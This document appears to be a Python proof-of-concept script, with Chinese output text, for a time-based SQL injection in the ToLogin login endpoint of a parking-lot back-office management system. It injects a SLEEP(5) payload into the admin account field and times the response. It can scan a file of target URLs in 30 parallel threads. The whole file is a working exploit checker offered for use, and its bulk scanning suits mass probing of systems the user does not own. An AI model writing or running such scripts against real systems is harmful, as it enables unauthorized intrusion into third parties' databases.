import time
import requests
from multiprocessing.dummy import Pool
import argparse

requests.packages.urllib3.disable_warnings()


def test_sql_injection(url, data, headers):
    start_time = time.time()
    try:
        response = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"响应状态码: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"请求失败: {e}")
        return False, None
    end_time = time.time()
    response_time = end_time - start_time
    print(f"响应时间: {response_time:.2f}秒")
    return response_time > 5, response_time


def check(target):
    url = f"{target}/Login/ToLogin"
    normal_data = {
        'Admins_Account': 'normal_username',
        'Admins_Pwd': 'normal_password'
    }
    sql_inject_payload = "1' AND (SELECT 8104 FROM (SELECT(SLEEP(5)))a) AND '1'='1"
    inject_data = normal_data.copy()
    inject_data['Admins_Account'] = sql_inject_payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }

    print(f"测试目标: {url}")


    print("测试正常登录数据...")
    normal_result, normal_time = test_sql_injection(url, normal_data, headers)
    print(f"正常登录响应时间: {normal_time:.2f}秒\n")


    print("测试SQL注入payload...")
    inject_result, inject_time = test_sql_injection(url, inject_data, headers)
    print(f"SQL注入响应时间: {inject_time:.2f}秒\n")


    if inject_result:
        print("检测到潜在的SQL延时注入漏洞！")
    else:
        print("没有检测到SQL注入漏洞。")


def main():
    parse = argparse.ArgumentParser(description="停车场后台管理系统 ToLogin SQL注入漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入单个URL')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请输入包含URL的文件')
    args = parse.parse_args()

    if args.url:
        check(args.url)
    else:
        targets = []
        try:
            with open(args.file, 'r') as f:
                for target in f:
                    target = target.strip()
                    if target:  # 检查是否为空行
                        targets.append(target)
        except FileNotFoundError:
            print(f"[ERROR] 文件 {args.file} 未找到。")
            return
        except Exception as e:
            print(f"[ERROR] 读取文件时出错: {e}")
            return

        pool = Pool(30)
        pool.map(check, targets)
        pool.close()
        pool.join()


if __name__ == "__main__":
    main()